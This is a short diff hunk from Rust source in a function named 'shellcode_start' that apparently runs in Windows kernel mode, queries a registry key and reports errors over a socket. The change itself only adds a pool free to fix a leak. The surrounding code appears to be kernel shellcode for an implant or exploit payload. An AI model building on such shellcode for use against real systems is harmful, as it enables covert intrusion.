@@ -380,6 +380,7 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                         let error_query_value_key_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x69u8, 0x6eu8, 0x20u8, 0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x20u8, 0x76u8, 0x61u8, 0x6cu8, 0x75u8, 0x65u8, 0x20u8, 0x6bu8, 0x65u8, 0x79u8, 0x0au8];
                         let _ = socket.send(&error_query_value_key_msg as *const u8, 25);
                     }
+                    ((*reg_funcs).ex_free_pool_with_tag)(value_name as _, 71);
                     ((*reg_funcs).ex_free_pool_with_tag)(query_buf as _, 71);
                     ntreg::close_handle(reg_funcs, handle);
                 } else {
